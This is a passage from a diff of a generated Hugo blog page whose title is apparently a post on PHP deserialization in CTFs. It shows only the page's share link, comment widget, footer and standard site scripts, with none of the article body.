2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share PHP 反序列化 on telegram" href="https://telegram.me/share/url?text=PHP%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96&url=https%3a%2f%2fshenyiming.life%2fpost%2fctf%2funserialize%2fphp%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
+</div>
+</footer>
+<style>:root{--article-font-family:"Noto Serif SC", var(--base-font-family)}</style>
+<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
+<div>
+<div class=pagination__title>
+<span class=pagination__title-h style=font-size:20px>💬评论</span>
+<hr>
+</div>
+<div id=tcomment></div>
+<script src=https://cdn.jsdelivr.net/npm/twikoo@1.4.17/dist/twikoo.all.min.js></script>
+<script>twikoo.init({envId:"https://shenyiming-github-io-comments.vercel.app/",el:"#tcomment",lang:'zh-CN',region:'ap-shanghai',path:'window.TWIKOO_MAGIC_PATH||window.location.pathname'})</script>
+</div>
+</article>
+</main><footer class=footer>
+<span>Copyright &copy; 2021-2022 <a href=https://shenyiming.life><b>Shenyiming.Life</b></a></span>
 <span>&#183;</span>
 <span>Built With <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span>
 <span>&#183;</span>
 <span>All Rights Reserved</span>
 <span>&#183;</span>
-<span><a href=https://beian.miit.gov.cn/>鲁ICP备2022020298号</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
-<script defer src=/assets/js/highlight.min.e85ad0406048e8176e1c7661b25d5c69297ddfe41dc4124cf75ecb99a4f7b3d1.js integrity="sha256-6FrQQGBI6BduHHZhsl1caSl93+QdxBJM917LmaT3s9E=" onload=hljs.initHighlightingOnLoad()></script>
-<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById("menu").scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById("menu").scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
+<span><a href=https://beian.miit.gov.cn/>鲁ICP备2022020298号</a></span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)">
+<button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</button>
+</a>
+<script defer src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+</body>
+</html>
